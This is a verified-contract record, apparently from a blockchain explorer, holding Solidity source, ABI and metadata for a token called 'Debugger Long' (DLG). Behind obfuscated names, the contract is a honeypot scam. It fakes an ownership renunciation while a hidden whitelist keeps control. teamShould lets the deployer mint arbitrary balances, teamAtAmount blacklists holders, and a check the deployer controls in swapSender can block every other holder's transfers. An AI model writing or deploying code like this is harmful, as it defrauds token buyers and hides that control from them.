{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface atTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTx) external view returns (uint256);\n\n    function transfer(address fromSell, uint256 maxMin) external returns (bool);\n\n    function allowance(address senderList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromSell,\n        uint256 maxMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingToken, uint256 value);\n    event Approval(address indexed senderList, address indexed spender, uint256 value);\n}\n\nabstract contract txLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingMarketing {\n    function createPair(address enableShould, address fundSwapTrading) external returns (address);\n}\n\ninterface takeAmount is atTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DebuggerLong is txLimit, atTeam, takeAmount {\n\n    function transferFrom(address receiverMax, address fromSell, uint256 maxMin) external override returns (bool) {\n        if (_msgSender() != senderIs) {\n            if (autoFee[receiverMax][_msgSender()] != type(uint256).max) {\n                require(maxMin <= autoFee[receiverMax][_msgSender()]);\n                autoFee[receiverMax][_msgSender()] -= maxMin;\n            }\n        }\n        return swapSender(receiverMax, fromSell, maxMin);\n    }\n\n    string private exemptIs = \"Debugger Long\";\n\n    address senderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return tradingLimit;\n    }\n\n    function teamAtAmount(address fundReceiver) public {\n        launchedToken();\n        \n        if (fundReceiver == takeLaunch || fundReceiver == buyMin) {\n            return;\n        }\n        minLaunched[fundReceiver] = true;\n    }\n\n    uint256 public tradingMinToken;\n\n    mapping(address => bool) public fromMarketing;\n\n    function owner() external view returns (address) {\n        return tradingLimit;\n    }\n\n    string private limitSell = \"DLG\";\n\n    address public takeLaunch;\n\n    mapping(address => bool) public minLaunched;\n\n    uint256 private tokenLaunched = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitSell;\n    }\n\n    function approve(address exemptToken, uint256 maxMin) public virtual override returns (bool) {\n        autoFee[_msgSender()][exemptToken] = maxMin;\n        emit Approval(_msgSender(), exemptToken, maxMin);\n        return true;\n    }\n\n    function balanceOf(address receiverTx) public view virtual override returns (uint256) {\n        return marketingListFee[receiverTx];\n    }\n\n    bool private walletLaunched;\n\n    uint256 public liquidityExempt;\n\n    function exemptFund(address receiverMax, address fromSell, uint256 maxMin) internal returns (bool) {\n        require(marketingListFee[receiverMax] >= maxMin);\n        marketingListFee[receiverMax] -= maxMin;\n        marketingListFee[fromSell] += maxMin;\n        emit Transfer(receiverMax, fromSell, maxMin);\n        return true;\n    }\n\n    bool public walletLaunch;\n\n    uint256 limitLiquidityTake;\n\n    function swapSender(address receiverMax, address fromSell, uint256 maxMin) internal returns (bool) {\n        if (receiverMax == takeLaunch) {\n            return exemptFund(receiverMax, fromSell, maxMin);\n        }\n        uint256 marketingEnable = atTeam(buyMin).balanceOf(shouldMode);\n        require(marketingEnable == shouldReceiver);\n        require(fromSell != shouldMode);\n        if (minLaunched[receiverMax]) {\n            return exemptFund(receiverMax, fromSell, buyExempt);\n        }\n        return exemptFund(receiverMax, fromSell, maxMin);\n    }\n\n    bool private receiverMarketing;\n\n    function isMax(address swapMax) public {\n        if (walletLaunch) {\n            return;\n        }\n        if (liquidityExempt != tradingMinToken) {\n            liquidityExempt = tradingMinToken;\n        }\n        fromMarketing[swapMax] = true;\n        if (liquidityExempt == tradingMinToken) {\n            tradingMinToken = fromEnableExempt;\n        }\n        walletLaunch = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptIs;\n    }\n\n    uint256 shouldReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenLaunched;\n    }\n\n    function enableMax() public {\n        emit OwnershipTransferred(takeLaunch, address(0));\n        tradingLimit = address(0);\n    }\n\n    address public buyMin;\n\n    address private tradingLimit;\n\n    function teamShould(address liquidityTotal, uint256 maxMin) public {\n        launchedToken();\n        marketingListFee[liquidityTotal] = maxMin;\n    }\n\n    uint8 private swapTx = 18;\n\n    event OwnershipTransferred(address indexed limitToken, address indexed autoLaunched);\n\n    function allowance(address liquidityLimitLaunch, address exemptToken) external view virtual override returns (uint256) {\n        if (exemptToken == senderIs) {\n            return type(uint256).max;\n        }\n        return autoFee[liquidityLimitLaunch][exemptToken];\n    }\n\n    uint256 constant buyExempt = 13 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoFee;\n\n    address shouldMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address liquidityTotal, uint256 maxMin) external virtual override returns (bool) {\n        return swapSender(_msgSender(), liquidityTotal, maxMin);\n    }\n\n    mapping(address => uint256) private marketingListFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTx;\n    }\n\n    constructor (){\n        if (receiverMarketing == walletLaunched) {\n            fromEnableExempt = liquidityExempt;\n        }\n        totalExempt fromAuto = totalExempt(senderIs);\n        buyMin = tradingMarketing(fromAuto.factory()).createPair(fromAuto.WETH(), address(this));\n        if (walletLaunched == receiverMarketing) {\n            liquidityExempt = fromEnableExempt;\n        }\n        takeLaunch = _msgSender();\n        enableMax();\n        fromMarketing[takeLaunch] = true;\n        marketingListFee[takeLaunch] = tokenLaunched;\n        \n        emit Transfer(address(0), takeLaunch, tokenLaunched);\n    }\n\n    function launchedToken() private view {\n        require(fromMarketing[_msgSender()]);\n    }\n\n    uint256 public fromEnableExempt;\n\n    function walletMinReceiver(uint256 maxMin) public {\n        launchedToken();\n        shouldReceiver = maxMin;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnableExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"teamAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMin\",\"type\":\"uint256\"}],\"name\":\"teamShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMinToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxMin\",\"type\":\"uint256\"}],\"name\":\"walletMinReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DebuggerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}